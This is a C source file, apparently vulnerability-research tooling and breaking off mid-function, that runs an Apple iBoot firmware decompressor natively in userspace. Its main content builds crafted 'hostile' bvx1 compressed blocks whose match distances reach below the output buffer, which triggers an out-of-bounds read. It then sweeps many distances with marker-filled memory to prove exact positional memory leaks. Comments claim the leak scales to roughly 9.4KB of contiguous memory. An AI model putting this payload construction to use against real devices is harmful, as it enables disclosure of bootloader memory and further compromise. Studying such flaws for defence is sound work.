// qsweep.c — iBoot (mBoot-18000.162.8 t8140) decompressor native-execution harness
// Rebuild of the lost harness per proven design: file-backed R|X image over an
// anon RW tail, PROT_NONE guard pages, SIGSEGV/BUS/ILL -> siglongjmp sweep loop.
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <signal.h>
#include <setjmp.h>
#include <compression.h>

typedef uint8_t  u8; typedef uint16_t u16; typedef uint32_t u32; typedef uint64_t u64;
typedef int8_t   s8; typedef int16_t s16; typedef int32_t s32; typedef int64_t s64;

#define GUARD    (512*1024)
#define APRON    (64*1024)
#define TAIL     (1024*1024)
#define FW_PATH  "/tmp/ds_iboot/iboot_dec.bin"
#define SCRATCH_SZ (192*1024)

/* v162.10 port: DS_FW env selects the binary; a "23g83" path applies the
 * +0x80 compression-cluster shift (direct core, dispatcher, FSE tables). */
static const char *g_fw_path = FW_PATH;
static uintptr_t OFF_DIRECT = 0x1E908C, OFF_DISP = 0x1EB3C8;
static uintptr_t TB_OFF[6] = {0x331340,0x331354,0x3313A4,0x3313B8,0x331408,0x331448};

static u8  *g_fw; static size_t g_fw_sz;

typedef long (*fn_direct)(void *dst, size_t dstlen, const void *src, size_t srclen, void *state);
typedef long (*fn_disp)  (void *dst, size_t dstlen, const void *src, size_t srclen, void *scr, u32 id);
static fn_direct g_direct; static fn_disp g_disp;

/* ---------- fault-guarded execution ---------- */
static sigjmp_buf g_jb; static volatile int g_armed;
struct F { int signo; u64 pc, addr; } g_F;
struct R { long ret; int faulted; struct F f; };

static void handler(int sig, siginfo_t *si, void *uc) {
  ucontext_t *u = (ucontext_t*)uc;
  u64 pc = u->uc_mcontext->__ss.__pc;
  u64 lr = u->uc_mcontext->__ss.__lr;
  if (!g_armed) {
    fprintf(stderr, "!! UNGUARDED fatal sig=%d addr=%p pc=%llx lr=%llx\n", sig, si->si_addr,
            (unsigned long long)pc - (unsigned long long)g_fw, (unsigned long long)lr - (unsigned long long)g_fw);
    _exit(66);
  }
  g_F.signo = sig; g_F.pc = pc; g_F.addr = (u64)si->si_addr;
  if (g_armed && getenv("DS_REGS")) {
    fprintf(stderr, "    esr=%llx(%s) x0=%llx x1=%llx x2=%llx x3=%llx x4=%llx x5=%llx fp=%llx\n",
      (unsigned long long)u->uc_mcontext->__es.__esr,
      (u->uc_mcontext->__es.__esr & 0x40) ? "WRITE" : "READ",
      (unsigned long long)u->uc_mcontext->__ss.__x[0],
      (unsigned long long)u->uc_mcontext->__ss.__x[1],
      (unsigned long long)u->uc_mcontext->__ss.__x[2],
      (unsigned long long)u->uc_mcontext->__ss.__x[2],
      (unsigned long long)u->uc_mcontext->__ss.__x[3],
      (unsigned long long)u->uc_mcontext->__ss.__x[4],
      (unsigned long long)u->uc_mcontext->__ss.__x[5],
      (unsigned long long)u->uc_mcontext->__ss.__fp);
  }
  {
    u64 fp = u->uc_mcontext->__ss.__fp;
    for (int i = 0; i < 6 && fp; i++) {
      u64 *fr = (u64*)fp;
      u64 lr = fr[1];
      fprintf(stderr, "    bt[%d] lr_off=%llx\n", i,
              (unsigned long long)(lr - (u64)g_fw));
      if (lr < (u64)g_fw || lr > (u64)g_fw + g_fw_sz) break;
      fp = fr[0];
      if ((u64)fp & 7) break;
    }
  }
  g_armed = 0;
  siglongjmp(g_jb, 1);
}

#define GUARDED(expr, outR) do { \
  g_armed = 1; \
  if (sigsetjmp(g_jb, 1) == 0) { (outR).ret = (expr); (outR).faulted = 0; g_armed = 0; } \
  else { (outR).ret = -9999; (outR).faulted = 1; (outR).f = g_F; } \
} while (0)

/* ---------- guarded buffers with marker aprons ---------- */
struct buf {
  u8 *payload;        // start of caller-writable region
  size_t cap;
  u8 *lo; u8 *hi;     // apron marker regions (readable, detect reads via diff)
  size_t lo_sz, hi_sz;
  u8 *raw; size_t total;
};

static void mkbuf(struct buf *b, size_t cap) {
  size_t total = GUARD + APRON + cap + APRON + GUARD;
  u8 *m = mmap(NULL, total, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
  if (m == MAP_FAILED) { perror("mmap"); exit(1); }
  mprotect(m, GUARD, PROT_NONE);
  mprotect(m + GUARD + APRON + cap + APRON, GUARD, PROT_NONE);
  memset(m + GUARD, 0xA5, APRON);                    // lower apron marker 0xA5
  memset(m + GUARD + APRON + cap, 0x5A, APRON);      // upper apron marker 0x5A
  b->raw = m; b->total = total;
  b->lo = m + GUARD; b->lo_sz = APRON;
  b->hi = m + GUARD + APRON + cap; b->hi_sz = APRON;
  b->payload = m + GUARD + APRON; b->cap = cap;
}

static void rmbuf(struct buf *b) { munmap(b->raw, b->total); }

/* count deviations from fill byte */
static size_t dirty(const u8 *p, size_t n, u8 fill) {
  size_t d = 0; for (size_t i = 0; i < n; i++) if (p[i] != fill) d++;
  return d;
}

/* ---------- fw mapping ---------- */
static void fw_map(void) {
  if (getenv("DS_FW")) g_fw_path = getenv("DS_FW");
  if (strstr(g_fw_path, "23g83")) {
    OFF_DIRECT += 0x80; OFF_DISP += 0x80;
    for (int i = 0; i < 6; i++) TB_OFF[i] += 0x80;
  }
  int fd = open(g_fw_path, O_RDONLY);
  if (fd < 0) { perror("open fw"); exit(1); }
  struct stat st; fstat(fd, &st); g_fw_sz = st.st_size;
  size_t rounded = (g_fw_sz + 0x3FFF) & ~0x3FFFul;
  size_t total = GUARD + rounded + TAIL + GUARD;
  u8 *m = mmap(NULL, total, PROT_NONE, MAP_ANON|MAP_PRIVATE, -1, 0);
  if (m == MAP_FAILED) { perror("mmap reserve"); exit(1); }
  void *fw = mmap(m + GUARD, g_fw_sz, PROT_READ|PROT_EXEC, MAP_FILE|MAP_PRIVATE|MAP_FIXED, fd, 0);
  if (fw != m + GUARD) { perror("mmap fw"); exit(1); }
  void *tail = mmap(m + GUARD + rounded, TAIL, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, -1, 0);
  if (tail != m + GUARD + rounded) { perror("mmap tail"); exit(1); }
  g_fw = fw;
  g_direct = (fn_direct)(g_fw + OFF_DIRECT);
  g_disp   = (fn_disp)  (g_fw + OFF_DISP);
  fprintf(stderr, "[fw] %s mapped at %p (size %zu, tail %d MB @%p)\n", g_fw_path, g_fw, g_fw_sz, TAIL/(1024*1024), tail);
  close(fd);
}

/* ---------- helpers ---------- */
static u32 rd32(const u8 *p) { u32 v; memcpy(&v, p, 4); return v; }
static u16 rd16(const u8 *p) { u16 v; memcpy(&v, p, 2); return v; }
static void wr32(u8 *p, u32 v) { memcpy(p, &v, 4); }
static void wr16(u8 *p, u16 v) { memcpy(p, &v, 2); }
static u64 rd64(const u8 *p) { u64 v; memcpy(&v, p, 8); return v; }
static void wr64(u8 *p, u64 v) { memcpy(p, &v, 8); }
static void hexdump(const char *tag, const u8 *p, size_t n) {
  printf("%s (%zu bytes):\n", tag, n);
  for (size_t i = 0; i < n; i += 16) {
    printf("  %04zx:", i);
    for (size_t j = 0; j < 16 && i+j < n; j++) printf(" %02x", p[i+j]);
    printf("\n");
  }
}

static size_t first_diff(const u8 *a, const u8 *b, size_t n) {
  for (size_t i = 0; i < n; i++) if (a[i] != b[i]) return i;
  return (size_t)-1;
}

/* ===================== synthetic bvx1 builder =====================
 * Stationary single-symbol FSE tables (freq = full table sum => every slot
 * maps to the symbol, total_bits=0, states never advance, zero index bits).
 * Only the dist extra-bits are real bits, packed per the backward reader:
 * forward concatenation s_0..s_{T-1} + zero pad so 1 <= U_pad <= 8 (or U=0),
 * leading whole zero bytes until stream >= 9 bytes (8-byte selector path).
 * Static value tables are read LIVE from the mapped firmware. */
static const u32 *TB_LR_BASE, *TB_ML_BASE, *TB_D_BASE;
static const u8   *TB_LR_XTRA, *TB_ML_XTRA, *TB_D_XTRA;
static void tb_init(void) {
  TB_LR_XTRA = g_fw + TB_OFF[0];
  TB_LR_BASE = (const u32*)(g_fw + TB_OFF[1]);
  TB_ML_XTRA = g_fw + TB_OFF[2];
  TB_ML_BASE = (const u32*)(g_fw + TB_OFF[3]);
  TB_D_XTRA  = g_fw + TB_OFF[4];
  TB_D_BASE  = (const u32*)(g_fw + TB_OFF[5]);
}

/* find dist symbol covering D; returns extra value; *W = width */
static int dist_encode(u32 D, int *sym_out, u32 *extra_out, int *W_out) {
  for (int s = 63; s >= 0; s--) {
    u32 b = TB_D_BASE[s]; int w = TB_D_XTRA[s];
    if (D >= b && (w == 64 || (D - b) < (1u << w))) { *sym_out = s; *extra_out = D - b; *W_out = w; return 0; }
  }
  return -1;
}

struct bw { u8 *b; size_t cap; size_t nbits; };   // forward MSB-first bit writer
static void bw_put(struct bw *w, u32 val, int nbits) {
  for (int i = nbits - 1; i >= 0; i--) {
    size_t bit = w->nbits++;
    size_t bytei = bit >> 3;
    if (bytei >= w->cap) return; /* caller sized */
    int off = 7 - (int)(bit & 7);
    u8 m = (u8)(1u << off);
    if ((val >> i) & 1) w->b[bytei] |= m; else w->b[bytei] &= (u8)~m;
  }
}

#define HDR_SZ 0x304

/* build one synthetic bvx1 block.
 * T matches; each match: L literals ('B'), M match bytes;
 * D[k] = distance for match k (all must share ONE dist symbol range).
 * Backward reader model: field k occupies j in [t+off_k, t+off_k+w_k) where
 * j counts bits from the stream end (j=0 = final byte LSB); a field's value
 * MSB sits at its LOWEST j; t trailing pad bits (sel = -t, 1<=t<=7);
 * leading zero bytes keep coded bits inside the initial 64-bit window. */
static long build_bvx1(u8 *out, size_t cap, int T, int L, int M, const u32 *D) {
  if (cap < HDR_SZ + 64 + T * 32 + 64) return -1;
  memset(out, 0, HDR_SZ + 64 + T * 32 + 64);
  wr32(out + 0x00, 0x31787662);            // 'bvx1'
  wr32(out + 0x04, (u32)(T * (L + M)));    // output size (informational)
  u16 *l_freq = (u16*)(out + 0x32), *m_freq = (u16*)(out + 0x5A);
  u16 *d_freq = (u16*)(out + 0x82), *b_freq = (u16*)(out + 0x102);
  int dsym = -1, Wsum = 0;
  int Ws[256]; u32 exs[256];
  if (T > 256) return -5;
  for (int k = 0; k < T; k++) {
    int s, W; u32 ex;
    if (dist_encode(D[k], &s, &ex, &W)) return -2;
    if (dsym < 0) dsym = s;
    else if (s != dsym) return -4;         // single-symbol dist table per block
    Ws[k] = W; exs[k] = ex; Wsum += W;
  }
  int Lsym = -1, Msym = -1;
  for (int s = 0; s < 20; s++) { if (!TB_LR_XTRA[s] && (int)TB_LR_BASE[s] == L) Lsym = s;
                                 if (!TB_ML_XTRA[s] && (int)TB_ML_BASE[s] == M) Msym = s; }
  if (Lsym < 0 || Msym < 0) return -3;
  l_freq[Lsym] = 64; m_freq[Msym] = 64; d_freq[dsym] = 256;
  b_freq[0x41] = 1024;                      // literal byte 'A', stationary
  int tpad = 7;
  size_t Cbits = (size_t)Wsum;
  size_t J = (size_t)tpad + Cbits;          // j ranges [0, J): j<t pad, then fields ascending
  size_t core = (J + 7) / 8; if (core == 0) core = 1;
  size_t Blmd = core < 32 ? 32 : core;      // >=32 total (header check), coded tail in window
  size_t lead = Blmd - core;
  wr32(out + 0x08, (u32)Blmd);              // payload bytes after header
  wr32(out + 0x0C, (u32)(T * L));           // n_literals
  wr32(out + 0x10, (u32)T);                 // n_matches
  wr32(out + 0x14, 0);                      // literal stream bytes (stationary)
  wr32(out + 0x18, (u32)Blmd);              // lmd stream bytes
  wr32(out + 0x1C, 0);                      // lit accumulator selector (7-byte path)
  wr32(out + 0x28, -(s32)tpad);             // lmd accumulator selector
  wr16(out + 0x2A, 0xFFFF);
  wr16(out + 0x20, 17); wr16(out + 0x22, 18); wr16(out + 0x24, 19); wr16(out + 0x26, 20);
  wr16(out + 0x2C, 5); wr16(out + 0x2E, 7); wr16(out + 0x30, 13);
  memset(out + HDR_SZ, 0, Blmd);
  size_t j = tpad;
  for (int k = 0; k < T; k++) {
    for (int b = 0; b < Ws[k]; b++, j++) {
      if ((exs[k] >> (Ws[k] - 1 - b)) & 1) {
        size_t bytei = Blmd - 1 - j / 8, q = 7 - (j % 8);
        out[HDR_SZ + bytei] |= (u8)(1u << q);
      }
    }
  }
  return (long)(HDR_SZ + Blmd);
}

/* reference LZ77 expansion of a synthetic block */
static void model_expand(int T, int L, int M, const u32 *D, u8 *out) {
  size_t cur = 0;
  for (int k = 0; k < T; k++) {
    for (int i = 0; i < L; i++) out[cur++] = 0x41;
    for (int i = 0; i < M; i++) { out[cur] = out[cur - D[k]]; cur++; }
  }
}

/* produced-length scan: first byte from the end that differs from fill */
static size_t produced_len(const u8 *dst, size_t cap, u8 fill) {
  size_t end = 0;
  for (size_t i = 0; i < cap; i++) { if (dst[i] != fill) end = i + 1; else if (end && i >= end) break; }
  return end;
}

/* =================== shared: run one synthetic block through a path =================== */
struct cell {
  int id;            // dispatcher id (0 => direct FUN_001E908C)
  int nb;            // number of blocks (1 or 2)
  int nopad;         // skip T%4 padding (Q3a truncation probe)
  int T[2], L[2], M[2];
  u32 D[2][8];
};
struct cellout {
  struct R r; long ret; int model_ok; size_t produced; size_t want;
  int foreign; char note[160]; u8 *dstbase;
  u8 snap[2048]; size_t snaplen;
};

static void run_cell(const struct cell *cin, struct cellout *o, int cmp_model) {
  u8 blk[8192];
  long bl = 0;
  memset(o, 0, sizeof(*o));
  o->want = 0;
  struct cell cc = *cin; // pad T to multiple of 4 (cross-block literal-group hygiene)
  if (cin->nopad) cc = *cin;
  for (int b = 0; b < cin->nb && !cin->nopad; b++) {
    int padn = (4 - cc.T[b] % 4) % 4;
    while (padn-- > 0 && cc.T[b] < 8) { cc.D[b][cc.T[b]] = cc.D[b][cc.T[b]-1]; cc.T[b]++; }
  }
  const struct cell *c = &cc;
  u8 *model = malloc(65536); memset(model, 0x11, 65536);
  size_t mo = 0;
  for (int b = 0; b < c->nb; b++) {
    long r2 = build_bvx1(blk + bl, sizeof(blk) - bl, c->T[b], c->L[b], c->M[b], c->D[b]);
    if (r2 < 0) { snprintf(o->note, sizeof(o->note), "build fail %ld", r2); o->ret = r2; free(model); return; }
    bl += r2;

    for (int k = 0; k < c->T[b]; k++) {
      for (int i = 0; i < c->L[b]; i++) model[mo++] = 0x41;
      for (int i = 0; i < c->M[b]; i++) { model[mo] = model[mo - c->D[b][k]]; mo++; }
    }
    o->want = mo;
  }
  wr32(blk + bl, 0x24787662); bl += 4;   // 'bvx$' end marker (staging requires clean termination)
  struct buf dst, scr, st;
  mkbuf(&dst, 65536); mkbuf(&scr, SCRATCH_SZ); mkbuf(&st, 262144);
  memset(dst.payload, 0x11, dst.cap);
  if (c->id == 0) GUARDED(g_direct(dst.payload, dst.cap, blk, bl, st.payload), o->r);
  else           GUARDED(g_disp(dst.payload, dst.cap, blk, bl, scr.payload, (u32)c->id), o->r);
  o->ret = o->r.ret;
  if (c->id == 0 && !o->r.faulted)
    o->ret = (long)(rd64(st.payload + 0x28) - rd64(st.payload + 0x18));  // void fn: read cursor
  if (!o->r.faulted && o->ret > 0 && cmp_model) {
    o->produced = (size_t)o->ret;
    o->model_ok = (o->produced == o->want && !memcmp(dst.payload, model, o->produced)) ? 1 : 0;
    if (!o->model_ok) {
      size_t dd = first_diff(dst.payload, model, o->produced < o->want ? o->produced : o->want);
      snprintf(o->note, sizeof(o->note), "len %zu!=%zu diff@%zd", o->produced, o->want,
               dd == (size_t)-1 ? -1 : (ssize_t)dd);
    }
  }
  for (size_t i = 0; i < dst.lo_sz; i++) if (dst.lo[i] != 0xA5) { o->foreign |= 1; break; }
  for (size_t i = 0; i < dst.hi_sz; i++) if (dst.hi[i] != 0x5A) { o->foreign |= 2; break; }
  o->dstbase = dst.payload;
  if (!o->r.faulted && o->ret > 0) {
    o->snaplen = ((size_t)o->ret < sizeof(o->snap)) ? (size_t)o->ret : sizeof(o->snap);
    memcpy(o->snap, dst.payload, o->snaplen);
} else o->snaplen = 0;
}

static void dump_state(const char *tag, struct buf *st) {
  const u8 *S = st->payload;
  printf("  [%s] +34=%08x +44=%08x +48=%08x +4C=%08x +340=%08x +344=%08x +348=%08x dstcur=%llu\n",
         tag, rd32(S+0x34), rd32(S+0x44), rd32(S+0x48), rd32(S+0x4C),
         rd32(S+0x340), rd32(S+0x344), rd32(S+0x348),
         (unsigned long long)(rd64(S+0x28) - rd64(S+0x18)));
}
/* ---- semi-synthetic builder: real canonical header + swapped freqs/payload ---- */
static u8 g_HREAL[HDR_SZ]; static int g_hreal_ok;
static void harvest_real_header(void) {
  FILE *f = fopen("/tmp/ds_iboot/harness/same64k.lz", "rb");
  if (!f) exit(9);
  fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
  u8 *d = malloc(sz); fread(d, 1, sz, f); fclose(f);
  struct buf st; mkbuf(&st, 262144);
  struct buf dst; mkbuf(&dst, 200000);
  struct R r; GUARDED(g_direct(dst.payload, dst.cap, d, sz, st.payload), r);
  memcpy(g_HREAL, st.payload + 0x3C, HDR_SZ);
  g_hreal_ok = !r.faulted;
  rmbuf(&st); rmbuf(&dst); free(d);
}
/* variant: T matches, L literals('A'), M match, all D[k] via ONE dist symbol.
 * writes into out (cap), returns block len. */
static long build_bvx1_real(u8 *out, size_t cap, int T, int L, int M, const u32 *D) {
  if (!g_hreal_ok || cap < HDR_SZ + 512) return -1;
  memcpy(out, g_HREAL, HDR_SZ);
  memset(out + 0x20, 0, HDR_SZ - 0x20);          // wipe states/flags/freqs
  int dsym = -1, Ws[280]; u32 exs[280];
  if (T > 280) return -5;
  for (int k = 0; k < T; k++) {
    int s, W; u32 ex;
    if (dist_encode(D[k], &s, &ex, &W)) return -2;
    if (dsym < 0) dsym = s; else if (s != dsym) return -4;
    Ws[k] = W; exs[k] = ex;
  }
  int Lsym = -1, Msym = -1;
  for (int s = 0; s < 20; s++) { if (!TB_LR_XTRA[s] && (int)TB_LR_BASE[s] == L) Lsym = s;
                                 if (!TB_ML_XTRA[s] && (int)TB_ML_BASE[s] == M) Msym = s; }
  if (Lsym < 0 || Msym < 0) return -3;
  wr16(out + 0x32 + 2*Lsym, 64);
  wr16(out + 0x5A + 2*Msym, 64);
  wr16(out + 0x82 + 2*dsym, 256);
  wr16(out + 0x102 + 2*0x41, 1024);
  int tpad = 7;
  size_t Cb = 0; for (int k = 0; k < T; k++) Cb += Ws[k];
  size_t J = tpad + Cb, core = (J + 7) / 8; if (!core) core = 1;
  size_t Blmd = core < 32 ? 32 : core;
  wr32(out + 0x04, (u32)(T * (L + M)));
  wr32(out + 0x08, (u32)Blmd);
  wr32(out + 0x0C, (u32)(T * L));
  wr32(out + 0x10, (u32)T);
  wr32(out + 0x14, 0);
  wr32(out + 0x18, (u32)Blmd);
  wr32(out + 0x1C, 0);
  wr32(out + 0x28, -(s32)tpad);
  wr16(out + 0x2A, 0xFFFF);
  wr16(out + 0x20, 17); wr16(out + 0x22, 18); wr16(out + 0x24, 19); wr16(out + 0x26, 20);
  wr16(out + 0x2C, 5); wr16(out + 0x2E, 7); wr16(out + 0x30, 13);
  memset(out + HDR_SZ, 0, Blmd);
  size_t j = tpad;
  for (int k = 0; k < T; k++)
    for (int b = 0; b < Ws[k]; b++, j++)
      if ((exs[k] >> (Ws[k]-1-b)) & 1) {
        size_t bytei = Blmd - 1 - j / 8;
        out[HDR_SZ + bytei] |= (u8)(1u << (7 - j % 8));
      }
  return (long)(HDR_SZ + Blmd);
}


/* ======================================================================
 * MISSION 1: positional-addressing sweep (v142 campaign, pos mode)
 * Proven model under test:
 *   match token emitted at produced-count P with distance D sources
 *   logical byte n from dst_begin + (P + n - D).  For D >= P + n the
 *   source lies BELOW dst_begin: silent OOB read (copier FUN_001EA100,
 *   fault instr @0x1EA188, word-aligned u32 load at floor4(idx)*4).
 * Apron below dst_begin carries position-encoded markers:
 *   byte at delta d  ==  f(d) = (u8)(d*7 + 13)
 * so a verified output window [P, P+n) equal to f(k)..f(k-n+1) proves an
 * exact positional read of [dst_begin-k-n+1, dst_begin-k].
 * ==================================================================== */
#define POS_LO (512*1024)

static void mkbuf_lo(struct buf *b, size_t cap, size_t lo_sz) {
  size_t total = GUARD + lo_sz + cap + APRON + GUARD;
  u8 *m = mmap(NULL, total, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
  if (m == MAP_FAILED) { perror("mmap"); exit(1); }
  mprotect(m, GUARD, PROT_NONE);
  mprotect(m + GUARD + lo_sz + cap + APRON, GUARD, PROT_NONE);
  memset(m + GUARD + lo_sz + cap, 0x5A, APRON);
  b->raw = m; b->total = total;
  b->lo = m + GUARD; b->lo_sz = lo_sz;
  b->hi = m + GUARD + lo_sz + cap; b->hi_sz = APRON;
  b->payload = m + GUARD + lo_sz; b->cap = cap;
}

static u8 fmarker(u32 d) { return (u8)(d * 7u + 13u); }

static void fill_apron(struct buf *b) {
  for (size_t d = 1; d <= b->lo_sz; d++) b->payload[-(ssize_t)d] = fmarker((u32)d);
}

/* one hostile block: T=4 tokens, each L literals('A') + M match bytes,
 * all distance D (single dist symbol per block). */
static long pos_build(u8 *out, size_t cap, int L, int M, u32 D) {
  u32 D4[4] = { D, D, D, D };
  return build_bvx1(out, cap, 4, L, M, D4);
}

/* expected stream model: warm(4,4,{4,5}) then NH hostile tokens (L,M,D),
 * pulls for negative indices come from the marker fn. */
static int pos_verify(const u8 *out, size_t produced, int Lh, int Mh, u32 D,
                      size_t want_total, int *shift_out) {
  size_t cur = 0;
  u8 warm[64];
  { /* warm reference: 4x (4 lit + 4 copy D=4/5 alternating) */
    u32 Dw[4] = {4,5,4,5}; size_t wo = 0;
    for (int k = 0; k < 4; k++) {
      for (int i = 0; i < 4; i++) warm[wo++] = 0x41;
      for (int i = 0; i < 4; i++) { warm[wo] = warm[wo - Dw[k]]; wo++; }
    }
  }
  if (produced < 32 || memcmp(out, warm, 32)) return 0;
  cur = 32;
  for (int tok = 0; tok < 4; tok++) {
    for (int i = 0; i < Lh; i++) {
      if (cur >= produced || out[cur] != 0x41) return 0; cur++;
    }
    for (int n = 0; n < Mh; n++) {
      if (cur >= produced) return 0;
      long idx = (long)cur - (long)D;           /* logical source index */
      u8 exp;
      if (idx >= 0) exp = out[idx];             /* in-window (shouldn't happen here) */
      else          exp = fmarker((u32)(-idx)); /* below dst_begin: marker fn */
      if (out[cur] != exp) { *shift_out = (int)((s8)exp - (s8)out[cur]); return 0; }
      cur++;
    }
  }
  *shift_out = 0;
  return (produced == want_total && cur == want_total);
}

static u32 g_dmax;
static void pos_sweep_delta(u32 k, int Lh, int Mh, int id, struct buf *dst,
                            struct buf *scr, struct buf *st) {
  u8 blk[8192];
  /* warm block (produces 32) + hostile block with D = 47 + k - 15 = 32+15-15+... 
   * token0 match starts at P = 32 + Lh; source byte0 targets delta k => D = P + k */
  u32 P0 = 32u + (u32)Lh;
  if (P0 + k > g_dmax) { printf("POS delta=%6u id=%#05x SKIP (D=%u > D_max)\n", k, id, P0 + k); return; }
  u32 Dw[4] = {4,5,4,5};
  long wa = build_bvx1(blk, sizeof(blk), 4, 4, 4, Dw);
  if (wa < 0) { printf("POS delta=%u BUILD-warm-fail %ld\n", k, wa); return; }
  long hb = pos_build(blk + wa, sizeof(blk) - wa, Lh, Mh, P0 + k);
  if (hb < 0) { printf("POS delta=%u BUILD-hostile-fail %ld\n", k, hb); return; }
  long bl = wa + hb;
  wr32(blk + bl, 0x24787662); bl += 4;

  memset(dst->payload, 0x11, dst->cap);
  fill_apron(dst);
  if (st) memset(st->payload, 0, 262144);

  struct R r;
  size_t produced; int faulted;
  if (id) {
    GUARDED(g_disp(dst->payload, dst->cap, blk, bl, scr->payload, (u32)id), r);
    faulted = r.faulted; produced = faulted ? 0 : (size_t)r.ret;
  } else {
    GUARDED(g_direct(dst->payload, dst->cap, blk, bl, st->payload), r);
    faulted = r.faulted;
    produced = faulted ? 0 : (size_t)(rd64(st->payload + 0x28) - rd64(st->payload + 0x18));
  }

  size_t want = 32 + 4u * (u32)(Lh + Mh);
  int shift = 0; int ok = 0;
  if (!faulted && produced == want)
    ok = pos_verify(dst->payload, produced, Lh, Mh, P0 + k, want, &shift);

  printf("POS delta=%6u id=%#05x ret=%3zu faulted=%d win_ok=%d", k, id, produced, faulted, ok);
  if (faulted) printf(" FAULT pc=%llx addr=%llx sig=%d deltavsbegin=%+lld",
                      (unsigned long long)r.f.pc, (unsigned long long)r.f.addr, r.f.signo,
                      (long long)((long long)r.f.addr - (long long)dst->payload));
  else if (!ok && shift) printf(" SHIFT=%d", shift);
  printf("\n");
}

static void pos_mode(void) {
  tb_init();
  g_dmax = TB_D_BASE[63] + ((1u << TB_D_XTRA[63]) - 1);
  struct buf dst, scr, st;
  mkbuf_lo(&dst, 65536, POS_LO);
  mkbuf(&scr, SCRATCH_SZ);
  mkbuf(&st, 262144);
  printf("== POS: positional addressing sweep (apron %uKB, f(d)=d*7+13) ==\n", POS_LO/1024);
  printf("== [state] dst_begin=%p lo_apron=[%p,%p) guard_below=%p ==\n",
         (void*)dst.payload, (void*)dst.lo, (void*)(dst.lo + dst.lo_sz), (void*)dst.raw);
  /* tables ceiling receipt */
  {
    u32 dmax = TB_D_BASE[63] + ((1u << TB_D_XTRA[63]) - 1);
    int mlmax = 0;
    for (int s = 0; s < 20; s++) {
      int w = TB_ML_XTRA[s];
      int mx = (int)TB_ML_BASE[s] + ((w >= 64) ? 0 : ((1 << w) - 1));
      if (mx > mlmax) mlmax = mx;
    }
    printf("== [tables] D_max=%u ML_max=%d (ML_BASE[19]=%u ML_XTRA[19]=%d) ==\n",
           dmax, mlmax, TB_ML_BASE[19], TB_ML_XTRA[19]);
  }

  /* --- K/pending-state receipt: warm-only decode, dump copier sub-state --- */
  {
    u8 blk[4096];
    u32 Dw[4] = {4,5,4,5};
    long bl = build_bvx1(blk, sizeof(blk), 4, 4, 4, Dw);
    if (bl < 0) { printf("== [pending] build fail %ld\n", bl); return; }
    wr32(blk + bl, 0x24787662); bl += 4;
    memset(dst.payload, 0x11, dst.cap);
    fill_apron(&dst);
    memset(st.payload, 0, 262144);
    struct R r; GUARDED(g_direct(dst.payload, dst.cap, blk, bl, st.payload), r);
    printf("== [pending] warm-only: faulted=%d produced=%llu pend_word=%08x pend_cnt=%u "
           "cursor_off=%llu ==\n", r.faulted,
           (unsigned long long)(rd64(st.payload+0x28) - rd64(st.payload+0x18)),
           rd32(st.payload + 0x30), rd32(st.payload + 0x34),
           (unsigned long long)(rd64(st.payload+0x28) - rd64(st.payload+0x18)));
  }

  /* --- S1: every delta 1..64 (both paths) --- */
  for (u32 k = 1; k <= 64; k++) {
    pos_sweep_delta(k, 15, 15, 0, &dst, &scr, &st);
    if (k <= 8 || (k % 8) == 0) pos_sweep_delta(k, 15, 15, 0x8A1, &dst, &scr, NULL);
  }
  /* --- S2: powers of two + ceiling --- */
  for (u64 k = 128; k <= 262144; k <<= 1) {
    u32 kk = (k > 262139) ? 262139 : (u32)k;
    pos_sweep_delta(kk, 15, 15, 0, &dst, &scr, &st);
  }
  pos_sweep_delta(262139, 15, 15, 0, &dst, &scr, &st);
  pos_sweep_delta(262139, 15, 15, 0x8A1, &dst, &scr, NULL);
  /* --- S3: dist-symbol boundaries (base / max encodable) every 8 syms + tails --- */
  for (int s = 0; s < 64; s += 8) {
    u32 b = TB_D_BASE[s]; int w = TB_D_XTRA[s];
    if (w >= 64) continue;
    pos_sweep_delta(b + 1, 15, 15, 0, &dst, &scr, &st);
    pos_sweep_delta(b + (1u << w) - 1, 15, 15, 0, &dst, &scr, &st);
  }
  { int s = 63; u32 b = TB_D_BASE[s]; int w = TB_D_XTRA[s];
    pos_sweep_delta(b + 1, 15, 15, 0, &dst, &scr, &st);
    pos_sweep_delta(b + (1u << w) - 1, 15, 15, 0, &dst, &scr, &st); }
  /* --- S4: 200 pseudo-random deltas --- */
  {
    u64 lcg = 0x9E3779B97F4A7C15ull;
    for (int i = 0; i < 200; i++) {
      lcg = lcg * 6364136223846793005ull + 1442695040888963407ull;
      u32 k = (u32)((lcg >> 33) % 262139) + 1;
      pos_sweep_delta(k, 15, 15, 0, &dst, &scr, &st);
    }
  }
  /* --- S5: pending-count invariance: Lh in {12,13,14,15} => token-start K=0,1,2,3
   *       under the putbyte model; SAME window content must land either way --- */
  printf("== POS-K: literal-count (pending) invariance at fixed delta=1000 ==\n");
  for (int Lh = 12; Lh <= 15; Lh++)
    pos_sweep_delta(1000, Lh, 15, 0, &dst, &scr, &st);
  /* --- S6: contiguous-window: Lh=0 chains 4 matches back-to-back ---
   * one hostile block leaks 60 CONTIGUOUS marker bytes [delta-59 .. delta]
   * (per-token n=15 is the stationary-table builder limit; the firmware ML
   * table itself allows up to ML_max=2359/token => 4x157-token blocks scale
   * the same construction to ~9.4KB contiguous). --- */
  {
    int Lz = 0, Mz = 15;
    u32 Dw[4] = {4,5,4,5};
    u8 blk[8192];
    long wa = build_bvx1(blk, sizeof(blk), 4, 4, 4, Dw);
    long hb = pos_build(blk + wa, sizeof(blk) - wa, Lz, Mz, 32 + 5000);
    printf("== POS-CONTIG: Lh=0 x4 tokens, 60 contiguous deltas ending at 5000 ==\n");
    if (wa > 0 && hb > 0) {
      long bl = wa + hb;
      wr32(blk + bl, 0x24787662); bl += 4;
      memset(dst.payload, 0x11, dst.cap);
      fill_apron(&dst);
      struct R r; GUARDED(g_direct(dst.payload, dst.cap, blk, bl, st.payload), r);
      size_t produced = r.faulted ? 0 : (size_t)(rd64(st.payload+0x28) - rd64(st.payload+0x18));
      int bad = -1;
      if (!r.faulted)
        for (int n = 0; n < 60; n++)
          if (dst.payload[32 + n] != fmarker((u32)(5000 - n))) { bad = n; break; }
